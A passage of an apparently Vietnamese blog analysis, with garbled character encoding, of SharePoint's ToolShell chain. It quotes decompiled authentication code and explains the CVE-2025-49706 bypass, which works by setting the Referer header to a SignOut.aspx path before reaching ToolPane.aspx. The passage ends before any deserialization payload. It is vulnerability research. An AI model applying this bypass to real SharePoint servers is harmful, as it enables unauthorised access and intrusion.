&lt;h2 id="ii-toolshell-in-sharepoint"&gt;II. ToolShell in Sharepoint
&lt;/h2&gt;&lt;p&gt;Do láº§n Ä‘áº§u vá»c Sharepoint, mÃ¬nh Ä‘Ã£ Ä‘i tÃ¬m má»™t CVE cÃ³ poc sáºµn Ä‘á»ƒ thá»±c hiá»‡n khai thÃ¡c, sau Ä‘Ã³ mÃ¬nh chá»n bug ToolShell vÃ¬ nÃ³ cÃ³ áº£nh hÆ°á»Ÿng Ä‘áº¿n táº¥t cáº£ version cá»§a Sharepoint 2013. Bug nÃ y trigger chá»‰ báº±ng 1 request, gá»“m 2 bÆ°á»›c: Bypass Authen vÃ  Deserialize to RCE.&lt;br&gt;
Äá»ƒ tiáº¿n hÃ nh debug vÃ  Ä‘á»c source cá»§a Sharepoint thÃ¬ mÃ¬nh sá»­ dá»¥ng Dnspy, chá»n Attach to Process vÃ  trá» Ä‘Ãºng tiáº¿n trÃ¬nh IIS w3wp.exe Ä‘ang cháº¡y Collection Site cá»§a Sharepoint táº¡i port 80:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/Hydk_5kBWe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Má»Ÿ tab Modules Ä‘á»ƒ xem cÃ¡c file dll Ä‘ang Ä‘Æ°á»£c tiáº¿n trÃ¬nh load, tá»« Ä‘Ã³ cÃ³ Ä‘Æ°á»£c dll Ä‘ang Ä‘Æ°á»£c Sharepoint load:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rJUruqyHZx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h3 id="cve-2025-49706-bypass-authentication"&gt;[CVE-2025-49706] Bypass Authentication
&lt;/h3&gt;&lt;p&gt;CVE-2025-49706 xáº£y ra táº¡i class SPRequestModule thuá»™c namespace Microsoft.SharePoint.ApplicationRuntime. ÄÃ¢y lÃ  má»™t class implements IHttpModule, sá»­ dá»¥ng Ä‘á»ƒ chá»©a cÃ¡c EventHandler trong request pipeline cá»§a IIS. &lt;br&gt;
Táº¡i Ä‘Ã¢y, method PostAuthenticateRequestHandler Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ xá»­ lÃ½ xÃ¡c thá»±c cÃ¡c HTTP request Ä‘áº¿n trong Sharepoint, chÃ­nh vÃ¬ váº­y nÃ³ Ä‘Æ°á»£c gá»i chá»‰ sau event BeginRequest:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rJ53O51HWe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
BÃªn trong hÃ m tá»“n táº¡i Ä‘oáº¡n code xá»­ lÃ½ truy cáº­p cÃ¡c file css js Ä‘á»‘i vá»›i ngÆ°á»i dÃ¹ng khÃ´ng xÃ¡c thá»±c nhÆ° sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;if (!context.User.Identity.IsAuthenticated){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if (flag4){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if (this.RequestPathIndex == SPRequestModule.PathIndex._layouts){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; Uri uri3 = null;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; try{
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; uri3 = context.Request.UrlReferrer;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; catch (UriFormatException){}
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if (uri3 != null){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; string absolutePath = uri3.AbsolutePath;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if (SPRequestModule.s_LoginUrl == null){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ULS.SendTraceTag(2470943U, ULSCat.msoulscat_WSS_Runtime, ULSTraceLevel.Unexpected, &amp;#34;LoginUrl is unset for request to &amp;#39;{0}&amp;#39;.&amp;#34;, new object[] { SPAlternateUrl.ContextUri });
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; else if (absolutePath.EndsWith(SPRequestModule.s_LoginUrl, StringComparison.OrdinalIgnoreCase) &amp;amp;&amp;amp; (text2.EndsWith(&amp;#34;.css&amp;#34;, StringComparison.OrdinalIgnoreCase) || text2.EndsWith(&amp;#34;.js&amp;#34;, StringComparison.OrdinalIgnoreCase))){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; context.SkipAuthorization = true;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; else if (!flag6 &amp;amp;&amp;amp; settingsForContext != null &amp;amp;&amp;amp; settingsForContext.UseClaimsAuthentication &amp;amp;&amp;amp; !settingsForContext.AllowAnonymous){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; SPUtility.SendAccessDeniedHeader(new UnauthorizedAccessException());
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; else if (flag5){
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; SPUtility.SendAccessDeniedHeader(new UnauthorizedAccessException());
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Logic code sáº½ cho phÃ©p ngÆ°á»i dÃ¹ng unauthen váº«n cÃ³ thá»ƒ truy cáº­p cÃ¡c file script js vÃ  stylesheet css Ä‘á»ƒ phá»¥c vá»¥ viá»‡c hiá»ƒn thá»‹. CÃ¡c trÆ°á»ng há»£p cÃ²n láº¡i sáº½ kiá»ƒm tra nháº±m tráº£ vá» status 401 vá» cho ngÆ°á»i dÃ¹ng. CÃ³ 3 nhÃ¡nh if else, náº¿u nhÆ° lÃ m cho false cáº£ 3 thÃ¬ ngÆ°á»i dÃ¹ng khÃ´ng xÃ¡c thá»±c cÃ³ thá»ƒ bypass Ä‘oáº¡n check nÃ y vÃ  tiáº¿p tá»¥c Ä‘Æ°á»£c xá»­ lÃ½ yÃªu cáº§u. Äá»ƒ lÃ m Ä‘Æ°á»£c Ä‘iá»u Ä‘Ã³ thÃ¬ cáº§n flag6 lÃ  true, cÃ²n flag4 vÃ  flag5 cáº§n cÃ³ giÃ¡ trá»‹ false.&lt;br&gt;
Xem xÃ©t Ä‘oáº¡n code Ä‘áº±ng trÆ°á»›c, ta tháº¥y Ä‘Æ°á»£c náº¿u nhÆ° flag4 mang giÃ¡ trá»‹ false thÃ¬ chÆ°Æ¡ng trÃ¬nh sáº½ nháº£y vÃ o nhÃ¡nh if(flag5) vÃ¬ flag5 = !flag4 = true:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="ne"&gt;bool&lt;/span&gt; &lt;span class="n"&gt;flag4&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SPSecurity&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AuthenticationMode&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;AuthenticationMode&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Forms&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;flag2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="ne"&gt;bool&lt;/span&gt; &lt;span class="n"&gt;flag5&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;flag4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;ULS&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SendTraceTag&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2373643&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ULSCat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;msoulscat_WSS_Runtime&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ULSTraceLevel&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Verbose&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Value for checkAuthenticationCookie is : {0}&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="n"&gt;flag5&lt;/span&gt; &lt;span class="p"&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="ne"&gt;bool&lt;/span&gt; &lt;span class="n"&gt;flag6&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;string&lt;/span&gt; &lt;span class="n"&gt;text2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FilePath&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ToLowerInvariant&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;flag5&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Uri&lt;/span&gt; &lt;span class="n"&gt;uri2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;try&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;uri2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;UrlReferrer&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;UriFormatException&lt;/span&gt;&lt;span class="p"&gt;){}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IsShareByLinkPage&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IsAnonymousVtiBinPage&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IsAnonymousDynamicRequest&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartsWith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;signoutPathRoot&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartsWith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;signoutPathPrevious&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartsWith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;signoutPathCurrent&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartsWith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;startPathRoot&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartsWith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;startPathPrevious&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartsWith&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;startPathCurrent&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uri2&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;SPUtility&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StsCompareStrings&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uri2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AbsolutePath&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;signoutPathRoot&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;SPUtility&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StsCompareStrings&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uri2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AbsolutePath&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;signoutPathPrevious&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;SPUtility&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StsCompareStrings&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uri2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AbsolutePath&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;signoutPathCurrent&lt;/span&gt;&lt;span class="p"&gt;)))){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;flag5&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;flag6&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Trong nhÃ¡nh if(flag5), server láº¥y ra giÃ¡ trá»‹ cá»§a header Referer vÃ  so sÃ¡nh giÃ¡ trá»‹ cá»§a cá»§a nÃ³ vá»›i giÃ¡ trá»‹ signoutPathRoot, signoutPathPrevious vÃ  signoutPathCurrent. Chá»‰ cáº§n má»™t trong cÃ¡c Ä‘iá»u kiá»‡n trÃªn Ä‘Ãºng thÃ¬ chÆ°Æ¡ng trÃ¬nh sáº½ set giÃ¡ trá»‹ flag5 lÃ  false vÃ  flag6 lÃ  true, Ä‘Ãºng vá»›i Ã½ Ä‘á»‹nh ban Ä‘áº§u. CÃ¡c giÃ¡ trá»‹ signoutPath mang giÃ¡ trá»‹ nhÆ° sau:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/B1F-K9yrbx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
HÃ m GetLayoutsFolder tráº£ vá» giÃ¡ trá»‹ &lt;code&gt;_layouts/15&lt;/code&gt; hoáº·c &lt;code&gt;_layouts&lt;/code&gt;:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/rkcfYcyrZe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Máº·c Ä‘á»‹nh thÃ¬ flag4 sáº½ cÃ³ giÃ¡ trá»‹ false, nÃªn Ä‘á»ƒ bypass cÆ¡ cháº¿ xÃ¡c thá»±c nÃ y, giÃ¡ trá»‹ cá»§a header Referer sáº½ lÃ  &lt;code&gt;/_layouts/SignOut.aspx&lt;/code&gt; hoáº·c &lt;code&gt;/_layouts/15/SignOut.aspx&lt;/code&gt;:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/BJ_VK5yH-e.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
PoC req gá»i khÃ´ng xÃ¡c thá»±c:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HJCBY5yBbe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Req bypass auth:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/Skq8t9kBZg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Tiáº¿p tá»¥c Ä‘i Ä‘áº¿n nÆ¡i trigger lá»— há»•ng trong PoC lÃ  file ToolPane.aspx, báº£n thÃ¢n file khÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t mÃ  chá»‰ cÃ³ Ä‘oáº¡n khai bÃ¡o code control náº±m táº¡i class Microsoft.SharePoint.WebPartPages.ToolPane:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;%@ Register TagPrefix=&amp;#34;WebPartPages&amp;#34; Namespace=&amp;#34;Microsoft.SharePoint.WebPartPages&amp;#34;%&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;WebPartPages:ToolPane runat=&amp;#34;server&amp;#34;/&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Táº¡i Ä‘Ã¢y, Method OnInit Ä‘Æ°á»£c gá»i Ä‘áº§u tiÃªn Ä‘á»ƒ khá»Ÿi táº¡o page, Ä‘á»“ng thá»i gá»i Ä‘áº¿n CheckForCustomToolpane Ä‘á»ƒ kiá»ƒm tra Ä‘Æ°á»ng dáº«n cÃ³ pháº£i Ä‘á»ƒ táº¡o ToolPane khÃ´ng:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/BkQNqc1rZl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
HÃ m CheckForCustomToolpane kiá»ƒm tra Ä‘Æ°á»ng dáº«n URL xem cÃ³ chá»©a &lt;code&gt;/_layouts/&lt;/code&gt; vÃ  káº¿t thÃºc báº±ng &lt;code&gt;/ToolPane.aspx&lt;/code&gt; hay khÃ´ng, náº¿u cÃ³ sáº½ tráº£ vá» true:
